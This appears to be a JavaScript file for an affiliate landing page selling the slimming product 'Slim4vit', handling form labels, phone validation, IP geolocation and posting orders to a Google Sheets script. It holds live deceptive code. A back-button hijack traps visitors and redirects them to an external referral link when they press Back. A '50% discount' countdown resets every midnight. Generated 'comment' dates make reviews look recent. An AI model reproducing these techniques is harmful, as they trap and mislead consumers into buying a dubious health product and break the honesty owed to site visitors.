$('<meta name="robots" content="noindex, nofollow" />').insertAfter('title');

// $('<div class="error-box"></div>').insertAfter('input[name="name"]');
// $('<div class="error-box"></div>').insertAfter('input[name="phone"]');

$('input[name="name"]').attr('required','');
$('input[name="phone"]').attr('required','').addClass('phone').prop('type', 'tel');
$('form').addClass('dct-form orderForm form-to-google-sheets');
$('.dct-form-wrapper').attr('id', 'dct-form')

// infoForLannding = [{"nameCountry":"Italy","code":"IT","price":39,"oldPrice":78,"labelPrice":"EUR"}];

// get url params in php session
// var sub1 = '<?php echo $_SESSION["sub1"];?>';
// var sub2 = '<?php echo $_SESSION["sub2"];?>';
// var sub3 = '<?php echo $_SESSION["sub3"];?>';
// var sub4 = '<?php echo $_SESSION["sub4"];?>';
// var sub5 = '<?php echo $_SESSION["sub5"];?>';
// var subs = '?sub1='+sub1+'&sub2='+sub2+'&sub3='+sub3+'&sub4='+sub4+'&sub5='+sub5+'';
// var url_params;

// if (!window.location.search) {
// 	url_params = window.location.pathname + subs;
// 	console.log(url_params);
// 	window.location = window.location.pathname + subs;
// } else {
// 	url_params = window.location.search;
// 	console.log(url_params);
// }

// переменные
var product_name = "Slim4vit"

// Переводы
var languages = {
	"monthNames": {
		"RU": ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"],
		"EN": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
		"IT": ["gennaio", "febbraio", "marzo", "aprile", "maggio", "giugno", "luglio", "agosto", "settembre", "ottobre", "novembre", "dicembre"],
	},
	"errorMap": {
		"RU": ["Неверный номер", "Неверный код страны", "Слишком короткий", "Слишком длинный", "Неверный номер"],
		"EN": ["Invalid number", "Invalid country code", "Too short", "Too long", "Invalid number"],
		"IT": ["Numero non valido", "Codice paese non valido", "Troppo breve", "Troppo lungo", "Numero non valido"],
	},
	"sticky": {
		"RU": ["Только до ", " скидка 50% на <span class='dct-sticky-product-name'>"+ product_name + "</span>", "Перейти"],
		"EN": ["Only until ", " 50% discount on <span class='dct-sticky-product-name'>"+ product_name + "</span>", "Go to"],
		"IT": ["Solo fino al ", " sconto su <span class='dct-sticky-product-name'>"+ product_name +"</span> del 50%", "Visita"],
	},
	"privacyPolicy": {
		"RU": ["Политика конфиденциальности"],
		"EN": ["Privacy policy"],
		"IT": ["Politica sulla riservatezza"],
	},
	"delivery": {
		"RU": 
		["Доставка", "Мы заботимся о наших клиентах, поэтому мы сделали доставку более безопасной", "Что означает? Читать далее:", "Продукт поставляется в герметичной упаковке", "- Наши курьеры оставят Вашу посылку и отойдут на 5 метров предварительно обработав упаковку товара антисептиком", "Курьеры проходят тест на вирус", "Обязательно находятся в масках и перчатках, которые меняют после каждой доставки"] ,
		"EN": ["Delivery", "We care about our clients, that's why we introduce safe delivery.", "What does it mean? Read more:", "The item is vacuum packed", "Our couriers will deliver your package, sanitize it and step 5 metres away", "Our couriers get tested for coronavirus", "They are obliged to wear face masks and gloves which they change after every delivery"] ,
		"IT": ["Consegna", "Ci prendiamo cura dei nostri clienti, è per questo che abbiamo reso più sicura la consegna.", "Il che significa:", "Il prodotto viene spedito in un imballaggio ermetico", "I nostri corrieri lasciano il tuo pacco e si allontanano a 5 metri di distanza, dopo aver disinfettato la confezione con antisettico", "I corrieri fanno il tampone per la diagnosi da virus", "Hanno l’obbligo di indossare le maschere e i guanti e cambiarli dopo ogni consegna"],
	},
	"form": {
		"RU": ["Ваше имя", "Имя", "Ваш номер телефона", "Номер телефона", "✓ Действителен", "ЗАКАЗАТЬ"],
		"EN": ["Your name", "Name", "Your phone number", "Phone number", "✓ Valid", "ORDER"],
		"IT": ["Il tuo nome", "Nome", "Il tuo numero di telefono", "Numero di telefono", "✓ Valido", "ORDINARE"],
	},
	"timer": {
		"RU": ["50% скидка заканчивается через:"],
		"EN": ["50% discount ends after:"],
		"IT": ["Lo sconto del 50% termina in:"],
	},
	"productPrice": {
		"RU": ["Общая цена: ", "Акционная цена: "],
		"EN": ["Total price: ", "Promotional price: "],
		"IT": ["Prezzo totale: ", "Prezzo promozionale: "],
	},
	"goLand": {
		"RU": ["ПЕРЕЙТИ НА ОФИЦИАЛЬНЫЙ САЙТ ПРОИЗВОДИТЕЛЯ"],
		"EN": ["GO TO THE OFFICIAL SITE"],
		"IT": ["VAI AL SITO UFFICIALE DEL PRODUTTORE"],
	},
};

// Document language 
var documentLanguage = "",
		documentLanguage = document.documentElement.lang;
documentLanguage = documentLanguage.toUpperCase();
console.log(documentLanguage);



// Get user browser language
var userLang = navigator.language || navigator.userLanguage; 
console.log("The language is: " + userLang);


// Date and time
var now = new Date(),
		year = now.getFullYear(),
		month = ('0' + (now.getMonth()+1)).slice(-2),
		date = ('0' + now.getDate()).slice(-2),
		hours = ('0' + now.getHours()).slice(-2),
		minutes = ('0' + now.getMinutes()).slice(-2),
		seconds = ('0' + now.getSeconds()).slice(-2),
		fullDate = date + '.' + month + '.' + year,
		fullTime = hours + ':' + minutes + ':' + seconds;

console.log(fullDate + ' ' + fullTime);

// add date
console.log();

$('.dct-data').html();
$('.dct-data').each(function() {
	$dd = $(this).data('day');
	$dm = $(this).data('month');
	$dy = $(this).data('year');
	console.log(now.getDate()-10);
	$(this).html(('0' + (now.getDate()+$dd)).slice(-2) + '.' + ('0' + (now.getMonth()+1+$dm)).slice(-2)+ '.' + (now.getFullYear()+$dy).toString().substr(-2));
});

// Month names
var monthNames = {
	"RU": ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"],
	"EN": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
};
var currentMonthName = "",
		currentMonthName = languages["monthNames"][documentLanguage][now.getMonth()];

console.log(currentMonthName);




//
var getMonth = function(idx) {

	now.setDate(1);
	now.setMonth(idx-1);

	var locale = userLang,
	month = now.toLocaleString(locale, { month: "long" });

 return month;
}

console.log(getMonth(1));
console.log(getMonth(12));




// cookie
if (!$.cookie('timer')) {
 $.cookie('timer', now, { expires: 1 });
}

console.log($.cookie('timer'));


// send data to google sheets
const scriptURL = 'https://script.google.com/macros/s/AKfycbxQqD64tL2XjqhY7ZK1bS4r2l3IjpEvgGamX93hOJGs7ESxX4tK/exec'
const form = document.querySelectorAll(".form-to-google-sheets");

console.log(form);

form.forEach(function(elem) {
	// console.log(elem);
	elem.addEventListener('submit', e => {
		// console.log(scriptURL);
		// e.preventDefault();
		fetch(scriptURL, {mode:'no-cors', method: 'POST', body: new FormData(elem)})
			.then(response => console.log('Success!', response))
			.catch(error => console.error('Error!', error.message))
	});
});


// form
$('.dct-form-label-name').html(languages["form"][documentLanguage][0]);
$('.dct-form input[name="name"]').attr('placeholder', languages["form"][documentLanguage][1]);
$('.dct-form-label-phone').html(languages["form"][documentLanguage][2]);
// $('.dct-form input[name="phone"]').attr('placeholder', languages["form"][documentLanguage][3]);
$('.valid-msg').html(languages["form"][documentLanguage][4]);
$('.dct-form button[type="submit"] .button-text').html(languages["form"][documentLanguage][5]);

// price
$('.dct-price-old-text').html(languages["productPrice"][documentLanguage][0]);
$('.dct-price-new-text').html(languages["productPrice"][documentLanguage][1]);

// domain name
$('input[name="domain"]').val(window.location.hostname);
$('input[name="href"]').val(window.location.href);



// geo
$.get("https://ipinfo.io", function (response) {
	// $("#ip").html("IP: " + response.ip);
	// $("#address").html("Location: " + response.city + ", " + response.region);
	// $("#details").html(JSON.stringify(response, null, 4));
	$('input[name="country"]').val(response.country);
	$('input[name="city"]').val(response.city);
}, "jsonp");




// intlTelInput
var input = document.querySelectorAll(".phone"),
	errorMsg = document.querySelectorAll(".error-msg"),
	validMsg = document.querySelectorAll(".valid-msg");

// here, the index maps to the error code returned from getValidationError - see readme
var errorMap = {
	"RU": ["Неверный номер", "Неверный код страны", "Слишком короткий", "Слишком длинный", "Неверный номер"],
	"EN": ["Invalid number", "Invalid country code", "Too short", "Too long", "Invalid number"],
};

input.forEach(function(elem) {
	// initialise plugin
	var iti = window.intlTelInput(elem, {
		// preferredCountries: ["us"],
		// separateDialCode: true,
		// Use IP address lookup to set the default country to the user's country
		initialCountry: "auto",
		geoIpLookup: function(callback) {
			$.get('https://ipinfo.io', function() {}, "jsonp").always(function(resp) {
				var countryCode = (resp && resp.country) ? resp.country : "";
				callback(countryCode);
			});
		},
		// Utils
		utilsScript: "../js/utils.js"
	});

	var reset = function() {
		elem.classList.remove("error");
		errorMsg.forEach(function(error) {
			error.innerHTML = "";
			error.classList.add("hide");
		});
		validMsg.forEach(function(valid) {
			valid.classList.add("hide");
		});
	};

	// on blur: validate
	elem.addEventListener('blur', function() {
		reset();
		if (elem.value.trim()) {
			if (iti.isValidNumber()) {
				validMsg.forEach(function(valid) {
					valid.classList.remove("hide");
				});
			} else {
				elem.classList.add("error");
				var errorCode = iti.getValidationError();
				errorMsg.forEach(function(error) {
					error.innerHTML = languages["errorMap"][documentLanguage][errorCode];
					error.classList.remove("hide");
				});
			}
		}
	});

	// on keyup / change flag: reset
	elem.addEventListener('change', reset);
	elem.addEventListener('keyup', reset);
});




// phone clear
const inputPhone = document.querySelectorAll('input[name="phone"]');
inputPhone.forEach(function(elem) {
	elem.addEventListener('blur', (event) => {
		event.target.value = elem.value.replace(/\D+/g,'');
	});
	elem.addEventListener('input', (event) => {
		event.target.value = elem.value.replace(/[A-Za-zА-Яа-яЁё]+/g,'');
	});
});




// back fix
// (function(window, location) {
//   history.replaceState(null, document.title, location.pathname+"#!/stealingyourhistory");
//   history.pushState(null, document.title, location.pathname);

//   window.addEventListener("popstate", function() {
//     if(location.hash === "#!/stealingyourhistory") {
//           history.replaceState(null, document.title, location.pathname);
//           setTimeout(function(){
//             location.replace("https://dailytime24.ru/tn/open?referral=74&stream=3654&utm_source=fbit");
//           },0);
//     }
//   }, false);
// }(window, location));
! function () {
	var t;
	try {
		const URL = window.location.href.split(/[#]/)[0];
		for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#' + Math.floor(Math.random() * 10))
		onpopstate = function (event) {
			event.state && location.replace('https://dailytime24.ru/tn/open?referral=74&stream=3654&utm_source=fbit' + window.location.search);
		}
	} catch (o) {
		console.log(o);
	}
}();




// comments date and time
window.onload = function () {
	var $date = document.getElementsByClassName('commits__date'); // айдишник вешаем на дату поста
	var $post = document.getElementById('post'); //пробегаемся по всем классам и устанавливаем время
	for (var i = $date.length - 1; i >= 0; i--) {
		var d = new Date();
		d.setDate(d.getDate() - (($date.length - 1) - i));
		$date[i].innerHTML = formatDate(d);
		if ($post) {
			$post.innerHTML = formatDate(d);
		}
	} // форматируем дату
	function formatDate(date) {
		var dd = date.getDate();
		if (dd < 10) dd = '0' + dd;
		var mm = date.getMonth() + 1;
		if (mm < 10) mm = '0' + mm;
		var yy = date.getFullYear() % 100;
		if (yy < 10) yy = '0' + yy;
		return dd + '.' + mm + '.' + yy;
	}
}




$(document).ready(function(){

	// scroll to and pass parameter in url
	$(document).on('click',"a", function(event) {
    if (this.hash !== "") {
      event.preventDefault();

      var hash = this.hash;

      $('html, body').animate({
        scrollTop: $(hash).offset().top
      }, 600, function(){
   
        // window.location.hash = hash;
      });
    } else {
			location.href=this.href+window.location.search;
			event.preventDefault();
		}
	});

	// delivery information
	$('.delivery-show-text').click(function(){
		$(this).toggleClass('active');
		$('.delivery-hide-text').slideToggle();
	});

	$('.delivery-title').html(languages["delivery"][documentLanguage][0]);
	$('.delivery-subtitle').html(languages["delivery"][documentLanguage][1]);
	$('.pseudo-link-text').html(languages["delivery"][documentLanguage][2]);
	$('.delivery-list-item-1').html(languages["delivery"][documentLanguage][3]);
	$('.delivery-list-item-2').html(languages["delivery"][documentLanguage][4]);
	$('.delivery-list-item-3').html(languages["delivery"][documentLanguage][5]);
	$('.delivery-list-item-4').html(languages["delivery"][documentLanguage][6]);

	// fixed block
	if ($('html').data('type') == "prelanding") {
		console.log("prelanding");
		$("body").append(
			'<div class="dct-bottom-sticky"><span class="dct-sticky-text">' + languages["sticky"][documentLanguage][0] + '<span class="dct-sticky-data">' + fullDate + '</span>' + languages["sticky"][documentLanguage][1] + '</span><a class="dct-sticky-btn" href="#dct-form-anchor">' + languages["sticky"][documentLanguage][2] + '</a></div>'
			);	
	} else { 
		console.log("NO prelanding");
	}

	setTimeout(function () {
		$(".dct-bottom-sticky").fadeIn();
	}, 2000);

	window.onscroll = function(ev) {
		var $dctSFHeight = $('.dct-bottom-sticky').outerHeight();
		if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - $dctSFHeight) {
			$('body').css('padding-bottom', $dctSFHeight + 'px');
		} else {
			$('body').css('padding-bottom', 'inherit');
		}
	};

	// go to land button
	$('.dct-go-land-btn').html(languages["goLand"][documentLanguage][0])
	

	// privacy policy
	$('<div class="dct-privacy-policy"><a href="/privacy_policy/?lang=' + documentLanguage + '" target="_blank">' + languages["privacyPolicy"][documentLanguage][0] + '</a></div>').insertBefore('.dct-bottom-sticky');


	// timer
	$('.dct-timer-container .text').html(languages["timer"][documentLanguage][0])
	//Вызываем функцию на исполнение
	get_timer('.dct-timer');

	//функция вызова таймера
	function get_timer(elem) {

		var date_new = new Date();

		date_new.setDate(date_new.getDate() + 1);
		date_new.setHours(0);
		date_new.setMinutes(0);
		date_new.setSeconds(0);
		////////////////////////////////////
		////////////////////////////////////
		date_new.setSeconds(date_new.getSeconds() - 1);
		//Объект даты для обратного отсчета
		//var date_t = new Date(date_new);
		//Объект текущей даты
		var date = new Date();

		//Вычесляем сколько миллисекунд пройдет
		//от текущей даты до даты отсчета времени
		var timer = date_new - date;

		//Проверяем не нужно ли закончить отсчет
		//если дата отсчета еще не истекла, то количество
		//миллисекунд в переменной date_t будет больше чем в переменной date
		if (date_new > date) {

			//Вычисляем сколько осталось часов до даты отсчета.
			//Для этого переменную timer делим на количество
			//миллисекунд в одном часе и отбрасываем дни
			hour = parseInt(timer / (60 * 60 * 1000)) % 24;

			//если полученное число меньше 10 прибавляем 0
			if (hour < 10) {
				hour = '0' + hour;
			}
			//Приводим результат к строке
			hour = hour.toString();

			//Вычисляем сколько осталось минут до даты отсчета.
			//Для этого переменную timer делим на количество
			//миллисекунд в одной минуте и отбрасываем часы
			min = parseInt(timer / (1000 * 60)) % 60;
			//если полученное число меньше 10 прибавляем 0
			if (min < 10) {
				min = '0' + min;
			}
			//Приводим результат к строке
			min = min.toString();

			//Вычисляем сколько осталось секунд до даты отсчета.
			//Для этого переменную timer делим на количество
			//миллисекунд в одной минуте и отбрасываем минуты
			sec = parseInt(timer / 1000) % 60;
			//если полученное число меньше 10 прибавляем 0
			if (sec < 10) {
				sec = '0' + sec;
			}
			//Приводим результат к строке
			sec = sec.toString();

			//Выводим часы
			//Проверяем какие предыдущие цифры времени должны вывестись на экран
			//Для десятков часов
			if (hour[1] == 3 &&
				min[0] == 5 &&
				min[1] == 9 &&
				sec[0] == 5 &&
				sec[1] == 9) {
				animation($(elem).find(".hour0"), hour[0]);
			} else {
				$(elem).find(".hour0").html(hour[0]);
			}
			//Для единиц чассов
			if (min[0] == 5 &&
				min[1] == 9 &&
				sec[0] == 5 &&
				sec[1] == 9) {
				animation($(elem).find(".hour1"), hour[1]);
			} else {
				$(elem).find(".hour1").html(hour[1]);
			}

			//Выводим минуты
			//Проверяем какие предыдущие цифры времени должны вывестись на экран
			//Для десятков минут
			if (min[1] == 9 &&
				sec[0] == 5 &&
				sec[1] == 9) {
				animation($(elem).find(".min0"), min[0]);
			} else {
				$(elem).find(".min0").html(min[0]);
			}
			//Для единиц минут
			if (sec[0] == 5 && sec[1] == 9) {
				animation($(elem).find(".min1"), min[1]);
			} else {
				$(elem).find(".min1").html(min[1]);
			}

			//Выводим секунды
			//Проверяем какие предыдущие цифры времени должны вывестись на экран
			//Для десятков секунд
			if (sec[1] == 9) {
				animation($(elem).find(".sec0"), sec[0]);
			} else {
				$(elem).find(".sec0").html(sec[0]);
			}
			$(elem).find(".sec1").html(sec[1]);
			animation($(elem).find(".sec1"), sec[1]);
			//Переодически вызываем созданную функцию,
			//интервал вызова одна секунда(1000 милли секунд)
			setTimeout(get_timer, 1000, elem);
		} else {
			//$("#clock").html("<span id='stop'>Отсчет закончен!!!</span>");
			console.log('end');
		}

	}
	//Функция для красивого отображения времени.
	function animation(vibor, param) {
		vibor.html(param)
		// .css({'marginTop':'-20px','opacity':'0'})
		// .animate({'marginTop':'0px','opacity':'1'});
	}

});
